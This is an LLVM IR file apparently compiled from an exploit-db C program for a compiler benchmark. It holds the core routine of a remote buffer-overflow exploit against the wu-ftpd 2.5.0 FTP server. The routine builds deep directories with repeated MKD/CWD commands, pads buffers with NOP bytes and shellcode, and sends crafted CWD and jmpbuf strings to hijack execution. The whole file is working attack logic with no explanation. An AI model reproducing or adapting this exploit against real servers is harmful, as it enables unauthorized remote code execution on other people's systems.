; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19560.c_wuftpd_250_sploitit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19560.c_wuftpd_250_sploitit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8*, i8*, i8*, i32 }
%struct.TYPE_5__ = type { i32, i32, i32, i64 }
%struct.TYPE_6__ = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"ftpd: \00", align 1
@tesopt = common dso_local global %struct.TYPE_4__ zeroinitializer, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"anonymous\00", align 1
@sptr = common dso_local global %struct.TYPE_5__* null, align 8
@hostinf = common dso_local global %struct.TYPE_6__ zeroinitializer, align 4
@debug = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [48 x i8] c"CWD %d + (dirlen %d * %d times) + fill %d = %d\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [114 x i8] c"shellcode too big, edit the source to use less padding,\0Ahmm.. this shouldn't have happened with LaM3rZ shellcode!\00", align 1
@.str.5 = private unnamed_addr constant [29 x i8] c"will try to longjmp to 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [54 x i8] c"errcatch(0x%x) - argvlen(%d) = start 0x%x - end 0x%x\0A\00", align 1
@disp = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [8 x i8] c"MKD %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"CWD %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [37 x i8] c"Now %d bytes deep in dir structure.\0A\00", align 1
@.str.10 = private unnamed_addr constant [26 x i8] c"Calculation wrong. Error!\00", align 1
@.str.11 = private unnamed_addr constant [38 x i8] c"Aw.. fuck! My fill is waaaay to big!\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.13 = private unnamed_addr constant [19 x i8] c"Sending final CWD\0A\00", align 1
@.str.14 = private unnamed_addr constant [41 x i8] c"cwd string too short.. check for 0x0's.\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"Sending jmpbuf\0A\00", align 1
@.str.16 = private unnamed_addr constant [44 x i8] c"jmpbuf string too short.. check for 0x0's.\0A\00", align 1
@.str.17 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @wuftpd_250_sploitit() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [2048 x i8], align 16
  %10 = call i32 @strlen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i32 %10, i32* %5, align 4
  %11 = load i8*, i8** getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 0), align 8
  %12 = call i32 @strlen(i8* %11)
  %13 = load i32, i32* %5, align 4
  %14 = add nsw i32 %13, %12
  store i32 %14, i32* %5, align 4
  %15 = call i32 @strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %5, align 4
  %17 = add nsw i32 %16, %15
  store i32 %17, i32* %5, align 4
  %18 = load i8*, i8** getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 1), align 8
  %19 = call i32 @strlen(i8* %18)
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, %19
  store i32 %21, i32* %5, align 4
  %22 = call i32 @strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %23 = load i32, i32* %5, align 4
  %24 = add nsw i32 %23, %22
  store i32 %24, i32* %5, align 4
  %25 = load i8*, i8** getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 1), align 8
  %26 = call i64 @strncmp(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %25, i32 9)
  %27 = icmp eq i64 %26, 0
  br i1 %27, label %28, label %34

28:                                               ; preds = %0
  %29 = load i8*, i8** getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 2), align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = add nsw i32 %30, 1
  %32 = load i32, i32* %5, align 4
  %33 = add nsw i32 %32, %31
  store i32 %33, i32* %5, align 4
  br label %34

34:                                               ; preds = %28, %0
  %35 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %36 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 8
  %38 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %39 = sub nsw i32 %37, %38
  %40 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %41 = add nsw i32 %40, 1
  %42 = sdiv i32 %39, %41
  store i32 %42, i32* %2, align 4
  %43 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %44 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 8
  %46 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %47 = sub nsw i32 %45, %46
  %48 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %49 = add nsw i32 %48, 1
  %50 = load i32, i32* %2, align 4
  %51 = mul nsw i32 %49, %50
  %52 = sub nsw i32 %47, %51
  store i32 %52, i32* %3, align 4
  %53 = load i32, i32* @debug, align 4
  %54 = icmp sgt i32 %53, 0
  br i1 %54, label %55, label %64

55:                                               ; preds = %34
  %56 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %57 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %58 = load i32, i32* %2, align 4
  %59 = load i32, i32* %3, align 4
  %60 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %61 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 8
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.3, i64 0, i64 0), i32 %56, i32 %57, i32 %58, i32 %59, i32 %62)
  br label %64

64:                                               ; preds = %55, %34
  %65 = load i8*, i8** @shellcode, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %68 = sub nsw i32 %67, 40
  %69 = icmp sgt i32 %66, %68
  br i1 %69, label %70, label %72

70:                                               ; preds = %64
  %71 = call i32 @err(i32 0, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.4, i64 0, i64 0))
  br label %72

72:                                               ; preds = %70, %64
  %73 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %74 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %73, i32 0, i32 1
  %75 = load i32, i32* %74, align 4
  %76 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %77 = add nsw i32 %75, %76
  %78 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %79 = load i8*, i8** @shellcode, align 8
  %80 = call i32 @strlen(i8* %79)
  %81 = sub nsw i32 %78, %80
  %82 = sdiv i32 %81, 2
  %83 = add nsw i32 %77, %82
  store i32 %83, i32* %1, align 4
  %84 = load i32, i32* @debug, align 4
  %85 = icmp sgt i32 %84, 0
  br i1 %85, label %86, label %89

86:                                               ; preds = %72
  %87 = load i32, i32* %1, align 4
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0), i32 %87)
  br label %89

89:                                               ; preds = %86, %72
  %90 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %91 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %90, i32 0, i32 2
  %92 = load i32, i32* %91, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sub nsw i32 %92, %93
  store i32 %94, i32* %4, align 4
  %95 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %96 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %95, i32 0, i32 2
  %97 = load i32, i32* %96, align 8
  %98 = add nsw i32 %97, 24
  %99 = add nsw i32 %98, 2
  %100 = add nsw i32 %99, 8
  store i32 %100, i32* %6, align 4
  %101 = load i32, i32* @debug, align 4
  %102 = icmp sgt i32 %101, 0
  br i1 %102, label %103, label %111

103:                                              ; preds = %89
  %104 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %105 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %104, i32 0, i32 2
  %106 = load i32, i32* %105, align 8
  %107 = load i32, i32* %5, align 4
  %108 = load i32, i32* %4, align 4
  %109 = load i32, i32* %6, align 4
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.6, i64 0, i64 0), i32 %106, i32 %107, i32 %108, i32 %109)
  br label %111

111:                                              ; preds = %103, %89
  %112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %113 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %114 = call i32 @memset(i8* %112, i32 65, i32 %113)
  %115 = load i32, i32* @debug, align 4
  %116 = icmp slt i32 %115, 3
  br i1 %116, label %117, label %118

117:                                              ; preds = %111
  store i32 0, i32* @disp, align 4
  br label %118

118:                                              ; preds = %117, %111
  store i32 0, i32* %7, align 4
  br label %119

119:                                              ; preds = %158, %118
  %120 = load i32, i32* %7, align 4
  %121 = load i32, i32* %2, align 4
  %122 = icmp slt i32 %120, %121
  br i1 %122, label %123, label %161

123:                                              ; preds = %119
  %124 = load i32, i32* %7, align 4
  switch i32 %124, label %147 [
    i32 0, label %125
    i32 1, label %143
  ]

125:                                              ; preds = %123
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %127 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %128 = call i32 @memset(i8* %126, i32 144, i32 %127)
  %129 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %130 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %129, i64 %131
  %133 = load i8*, i8** @shellcode, align 8
  %134 = call i32 @strlen(i8* %133)
  %135 = sext i32 %134 to i64
  %136 = sub i64 0, %135
  %137 = getelementptr inbounds i8, i8* %132, i64 %136
  %138 = ptrtoint i8* %137 to i32
  %139 = load i8*, i8** @shellcode, align 8
  %140 = load i8*, i8** @shellcode, align 8
  %141 = call i32 @strlen(i8* %140)
  %142 = call i32 @memcpy(i32 %138, i8* %139, i32 %141)
  br label %148

143:                                              ; preds = %123
  %144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %145 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %146 = call i32 @memset(i8* %144, i32 144, i32 %145)
  br label %148

147:                                              ; preds = %123
  br label %148

148:                                              ; preds = %147, %143, %125
  %149 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 3), align 8
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 %150
  store i8 0, i8* %151, align 1
  %152 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %153 = call i32 @putserv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %152)
  %154 = call i32 (...) @getline()
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %156 = call i32 @putserv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* %155)
  %157 = call i32 (...) @getline()
  br label %158

158:                                              ; preds = %148
  %159 = load i32, i32* %7, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %7, align 4
  br label %119

161:                                              ; preds = %119
  %162 = call i32 (...) @getpwd()
  store i32 1, i32* @disp, align 4
  %163 = load i32, i32* @debug, align 4
  %164 = icmp sgt i32 %163, 0
  br i1 %164, label %165, label %168

165:                                              ; preds = %161
  %166 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %167 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0), i32 %166)
  br label %168

168:                                              ; preds = %165, %161
  %169 = load i32, i32* %3, align 4
  %170 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %171 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %174 = sub nsw i32 %172, %173
  %175 = icmp ne i32 %169, %174
  br i1 %175, label %176, label %178

176:                                              ; preds = %168
  %177 = call i32 @err(i32 0, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.10, i64 0, i64 0))
  br label %178

178:                                              ; preds = %176, %168
  %179 = load i32, i32* %3, align 4
  %180 = icmp sgt i32 %179, 506
  br i1 %180, label %181, label %183

181:                                              ; preds = %178
  %182 = call i32 @err(i32 0, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.11, i64 0, i64 0))
  br label %183

183:                                              ; preds = %181, %178
  %184 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %185 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %184, i32 0, i32 3
  %186 = load i64, i64* %185, align 8
  %187 = icmp ne i64 %186, 0
  %188 = zext i1 %187 to i64
  %189 = select i1 %187, i32 12, i32 8
  %190 = load i32, i32* %3, align 4
  %191 = add nsw i32 %190, %189
  store i32 %191, i32* %3, align 4
  %192 = load i32, i32* %3, align 4
  %193 = sdiv i32 %192, 4
  store i32 %193, i32* %8, align 4
  %194 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8 0, i8* %194, align 16
  store i32 0, i32* %7, align 4
  br label %195

195:                                              ; preds = %204, %183
  %196 = load i32, i32* %7, align 4
  %197 = load i32, i32* %8, align 4
  %198 = icmp slt i32 %196, %197
  br i1 %198, label %199, label %207

199:                                              ; preds = %195
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %201 = load i32, i32* %4, align 4
  %202 = call i8* @int2char(i32 %201)
  %203 = call i32 @strcat(i8* %200, i8* %202)
  br label %204

204:                                              ; preds = %199
  %205 = load i32, i32* %7, align 4
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %7, align 4
  br label %195

207:                                              ; preds = %195
  store i32 1, i32* %7, align 4
  br label %208

208:                                              ; preds = %218, %207
  %209 = load i32, i32* %7, align 4
  %210 = load i32, i32* %3, align 4
  %211 = load i32, i32* %8, align 4
  %212 = mul nsw i32 %211, 4
  %213 = sub nsw i32 %210, %212
  %214 = icmp slt i32 %209, %213
  br i1 %214, label %215, label %221

215:                                              ; preds = %208
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %217 = call i32 @strcat(i8* %216, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  br label %218

218:                                              ; preds = %215
  %219 = load i32, i32* %7, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %7, align 4
  br label %208

221:                                              ; preds = %208
  %222 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %223 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %224 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load i32, i32* getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 4
  %227 = add nsw i32 %225, %226
  %228 = add nsw i32 %227, 13
  %229 = call i8* @int2char(i32 %228)
  %230 = call i32 @strcat(i8* %222, i8* %229)
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %232 = load i32, i32* %6, align 4
  %233 = call i8* @int2char(i32 %232)
  %234 = call i32 @strcat(i8* %231, i8* %233)
  %235 = load i32, i32* @debug, align 4
  %236 = icmp sgt i32 %235, 0
  br i1 %236, label %237, label %239

237:                                              ; preds = %221
  %238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.13, i64 0, i64 0))
  br label %239

239:                                              ; preds = %237, %221
  %240 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %241 = call i32 @strlen(i8* %240)
  %242 = icmp slt i32 %241, 20
  br i1 %242, label %243, label %245

243:                                              ; preds = %239
  %244 = call i32 @err(i32 0, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.14, i64 0, i64 0))
  br label %245

245:                                              ; preds = %243, %239
  %246 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %247 = call i32 @putserv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* %246)
  %248 = call i32 (...) @getline()
  %249 = load i32, i32* @debug, align 4
  %250 = icmp sgt i32 %249, 0
  br i1 %250, label %251, label %253

251:                                              ; preds = %245
  %252 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0))
  br label %253

253:                                              ; preds = %251, %245
  %254 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8 0, i8* %254, align 16
  store i32 0, i32* %7, align 4
  br label %255

255:                                              ; preds = %263, %253
  %256 = load i32, i32* %7, align 4
  %257 = icmp slt i32 %256, 8
  br i1 %257, label %258, label %266

258:                                              ; preds = %255
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %260 = load i32, i32* %1, align 4
  %261 = call i8* @int2char(i32 %260)
  %262 = call i32 @strcat(i8* %259, i8* %261)
  br label %263

263:                                              ; preds = %258
  %264 = load i32, i32* %7, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %7, align 4
  br label %255

266:                                              ; preds = %255
  %267 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %268 = call i32 @strlen(i8* %267)
  %269 = icmp ne i32 %268, 32
  br i1 %269, label %270, label %272

270:                                              ; preds = %266
  %271 = call i32 @err(i32 0, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.16, i64 0, i64 0))
  br label %272

272:                                              ; preds = %270, %266
  %273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %274 = call i32 @putserv(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* %273)
  %275 = call i32 (...) @getline()
  ret i32 1
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i32, i8*, i32) #1

declare dso_local i32 @putserv(i8*, i8*) #1

declare dso_local i32 @getline(...) #1

declare dso_local i32 @getpwd(...) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i8* @int2char(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
